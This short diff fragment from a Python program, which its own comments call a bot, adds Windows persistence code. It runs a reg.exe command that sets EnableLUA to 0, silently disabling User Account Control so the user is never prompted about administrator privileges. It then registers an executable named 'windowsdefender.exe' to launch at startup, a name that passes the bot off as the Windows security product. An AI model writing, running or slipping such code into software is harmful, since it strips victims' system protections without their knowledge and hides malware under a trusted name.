@@ -16,6 +16,9 @@ def add2startup(pathname):
 
 if __name__=="__main__":
     if platform.system()=="Windows":
+        #changing the uac settings so that windows never notifies the user for administrator previleges
+        os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
+        #adding bot in startuplist
         add2startup(path.join(os.getcwd(),"windowsdefender.exe"))
     while True:
         try:
